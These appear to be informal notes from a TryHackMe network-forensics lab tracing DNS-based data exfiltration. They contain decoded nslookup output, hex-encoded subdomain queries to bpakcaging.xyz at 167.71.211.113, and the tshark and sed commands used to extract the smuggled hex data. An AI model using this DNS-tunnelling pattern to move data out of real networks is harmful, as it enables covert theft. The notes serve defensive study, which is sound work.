49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 68 111 110 101 13 10 13 10 80 97 116 104 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 13 10 45 45 45 45 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 13 10 67 58 92 85 115 101 114 115 92 106 46 119 101 115 116 99 111 116 116 92 68 111 99 117 109 101 110 116 115 13 10 13 10 13 10OK



 *** UnKnown can't find .bpakcaging.xyz: Unspecified error 
 *** No address (A) records available for CF54280D2687FE7811588BEB71FEDD008C1AEFE46E3AFD71B3.bpakcaging.xyz 
 *** UnKnown can't find .bpakcaging.xyz: Unspecified error 
 *** No address (A) records available for B921E7F311F44F570D85FD09FFAB3DF255B350D4110B9F0FE5.bpakcaging.xyz 
 *** No address (A) records available for 76F864F2A8A4.bpakcaging.xyz 
 Server:  UnKnown
Address:  167.71.211.113


Path                         
----                         
C:\Users\j.westcott\Documents

filter ip.dst == 167.71.211.113

Protocol DNS

filter dns.qry.type == 1 && ip.dst == 167.71.211.113

I see it
filter dns.qry.name matches ".bpakcaging.xyz$" && ip.dst == 167.71.211.113

using tshark

ubuntu@tryhackme:~/Desktop/artefacts$ tshark -r capture.pcapng -Y "dns.qry.name matches "\.bpakcaging\.xyz$" && ip.dst == 167.71.211.113" -T fields -e dns.qry.name | grep -v eu-west > raw.bin
ubuntu@tryhackme:~/Desktop/artefacts$ more raw.bin 
03D9A29A67FB4BB50100030002100031C1F2E6BF714350BE58.bpakcaging.xyz

https://linuxconfig.org/learning-linux-commands-sed
 sed 's/[a-g]//g' file.txt
Remove all characters from a to g from file.txt

so final will be

ubuntu@tryhackme:~/Desktop/artefacts$ cat raw.bin | sed 's/.bpakcaging.xyz//g' > final.bin
ubuntu@tryhackme:~/Desktop/artefacts$ more final.bin
03D9A29A67FB4BB50100030002100031C1F2E6BF714350BE58
05216AFC5AFF03040001000000042000AF4DE7A467FADFBFEB
EB78AE194B03926333E0CC968727A1FF8CC4CD5151FAAC0520
00516334C81F95A871AE6F5C6BB97075B74C6016ADAD4C35B3
A327BFF48B837B4806080060EA0000000000000710000F22FE
38943F8ED485C92DA84BCCE2E2082000C47157BAF0E6A7EF35
A00731B6CE6192813F7AC951F0C6460D89A27D91DE15C50920
007187B84DD4E121AED3668F75F3761E8AAC3169F81025A5AE
30D657448F4401890A0400020000000004000D0A0D0A3865AE
FAA72AA7E2FC9869F30F566E4F58A19582BDA4C0988D8E9F6C
07B1BEE158304DACEAF21C13DA10E879F18F2F7B49A47E0E51
8937D7D640D840A9AE690350A5FC0688CB812608BF7EA09610
92AC88160CD73CD9C28C531FAB846C59856ADD3A3C5079F577
..........

